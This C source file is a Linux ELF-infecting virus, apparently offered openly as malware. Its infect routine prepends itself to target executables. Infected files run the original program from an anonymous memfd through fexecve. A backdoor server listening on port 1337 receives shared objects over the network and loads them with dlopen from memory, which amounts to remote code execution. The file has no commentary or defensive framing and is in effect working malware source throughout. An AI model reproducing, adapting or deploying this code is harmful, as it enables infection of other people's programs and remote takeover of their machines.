#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/unistd.h>
//#include <sys/ptrace.h>
#include <dlfcn.h>
#include <elf.h>
#include <sys/wait.h> 
#include <sys/socket.h> 
#include <netinet/in.h>
#include <arpa/inet.h>

#define always_inline __attribute__((always_inline))
#define optimize(x) __attribute__((optimize(x)))

#define memfd_create(x,y) syscall(__NR_memfd_create, x, y)

extern char** environ;

always_inline optimize(3) static inline long elf_size(FILE*);
always_inline optimize(3) static inline int is_elf(char*);
always_inline optimize(3) static inline int is_infected(char*);
always_inline optimize(3) static inline void infect(FILE*, FILE*);
always_inline optimize(3) static inline void execute_host(FILE*, char**, char**);
always_inline optimize(3) static inline void load_so(int, int);
always_inline optimize(3) static inline void process_connection(int);
always_inline optimize(3) static inline void server();


int main(int argc, char** argv){
  if(argc == 2 && is_elf(argv[1]) && !is_infected(argv[1])){
    FILE* host=fopen(argv[1], "rb+");
    FILE* parasite=fopen(argv[0], "rb");
    if(host && parasite){
      infect(host, parasite);
      fclose(host);
      fclose(parasite);
    }
  }else if(argc == 1 && is_infected(argv[0])){
    FILE* infected=fopen(argv[0], "rb");
    fprintf(stderr, "infected ");
    execute_host(infected, argv, environ);
  }
  server();
}

long elf_size(FILE* f){
  Elf64_Ehdr header;
  fread(&header, 1, sizeof(Elf64_Ehdr), f);
  fseek(f, 0, SEEK_SET);
  return header.e_shoff+(header.e_shentsize*header.e_shnum);
}

int is_elf(char* f){
  FILE* file = fopen(f, "rb");
  if(file){
    Elf64_Ehdr header;
    fread(&header, 1, sizeof(Elf64_Ehdr), file);
    fclose(file);
    if(memcmp(header.e_ident, ELFMAG, SELFMAG) == 0){
      return 1;
    }
  }
  return 0;
}

int is_infected(char* f){
  FILE* file = fopen(f, "rb");
  if(file){
    long e_size = elf_size(file);
    fseek(file, 0, SEEK_END);
    long f_size = ftell(file);
    fclose(file);
    if(f_size-e_size != 0){
      return 1;
    }
  }
  return 0;
}

void infect(FILE* h, FILE* p){
  long h_size = elf_size(h);
  long p_size = elf_size(p);
  char h_buffer[h_size];
  char p_buffer[p_size];
  fread(h_buffer, sizeof(char), h_size, h);
  fread(p_buffer, sizeof(char), p_size, p);
  fseek(h, 0, SEEK_SET);
  fwrite(p_buffer, sizeof(char), p_size, h);
  fwrite(h_buffer, sizeof(char), h_size, h);
}

void execute_host(FILE* f, char** argv, char** envp){
  long p_size = elf_size(f);
  fseek(f, p_size, SEEK_SET);
  long h_size = elf_size(f);
  char host[h_size];
  fseek(f, p_size, SEEK_SET);
  fread(host, sizeof(char), h_size, f);
  int fd = memfd_create("", 1);
  write(fd, host, h_size);  
  pid_t pid;
  if((pid = fork()) == 0){
    fexecve(fd, argv, envp);
    exit(0);
  }else{
    wait(NULL);
  }
}


void load_so(int connection_fd, int size){
  char* file_buff = (char*)malloc(sizeof(char)*size);
  int fd = memfd_create("", 1);
  recv(connection_fd, file_buff, sizeof(char)*size, 0);
  write(fd, file_buff, size);
  free(file_buff);
  void* handle;
  char file_path[20];
  sprintf(file_path, "/proc/self/fd/%d", fd);
  handle = dlopen(file_path, RTLD_LAZY);
  dlclose(handle);
}

void process_connection(int connection_fd){
  while(1){
    char buff[13];
    if(recv(connection_fd, buff, sizeof(buff), 0) != 13){
      continue;
    }
    int size = atoi(buff);
    load_so(connection_fd, size);
  }
}

void server(){
  int socket_fd, connection_fd, addr_len; 
  struct sockaddr_in server_addr, client; 
  socket_fd = socket(AF_INET, SOCK_STREAM, 0);
  memset(&server_addr, 0, sizeof(server_addr));
  server_addr.sin_family = AF_INET; 
  server_addr.sin_addr.s_addr = htonl(INADDR_ANY); 
  server_addr.sin_port = htons(1337);
  bind(socket_fd, (struct sockaddr*)&server_addr, sizeof(server_addr));
  listen(socket_fd, 5);
  addr_len = sizeof(client);
  while(1){
    connection_fd = accept(socket_fd, (struct sockaddr*)&client, &addr_len);
    if(connection_fd > 0){
      pid_t pid;
      if((pid = fork()) == 0){
	process_connection(connection_fd);
      }else{
	wait(NULL);
	close(connection_fd);
      }
    }
  }
}
